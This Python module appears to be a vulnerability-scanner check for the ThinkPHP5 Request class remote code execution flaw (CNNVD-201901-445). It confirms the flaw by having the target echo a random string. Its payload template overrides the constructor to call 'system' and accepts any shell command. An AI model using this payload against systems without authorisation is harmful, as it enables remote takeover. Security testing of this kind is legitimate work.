#!/usr/bin/env python3
# -*- coding:utf-8 -*-

from lib.tool.md5 import random_md5
from lib.tool import check

cnnvd_201901_445_payloads = [
    {
        'path': 'index.php?s=captcha',
        'data': '_method=__construct&filter[]=system&method=get&server[REQUEST_METHOD]={RCECOMMAND}'
    }
]

def cnnvd_201901_445_scan(self, clients):
    ''' ThinkPHP5 核心类Request远程代码执行'''
    client = clients.get('reqClient')

    vul_info = {
        'app_name': self.app_name,
        'vul_type': 'RCE',
        'vul_id': 'CNNVD-201901-445',
    }

    for payload in cnnvd_201901_445_payloads:
        randomStr = random_md5(6)
        RCEcommand = 'echo ' + randomStr
        
        path = payload['path']
        data = payload['data'].format(RCECOMMAND=RCEcommand)

        res = client.request(
            'post',
            path,
            data=data,
            vul_info=vul_info
        )
        if res is None:
            continue

        if (check.check_res(res.text, randomStr)):
            results = {
                'Target': res.request.url,
                'Type': [vul_info['app_name'], vul_info['vul_type'], vul_info['vul_id']],
                'Request': res
            }
            return results
    return None
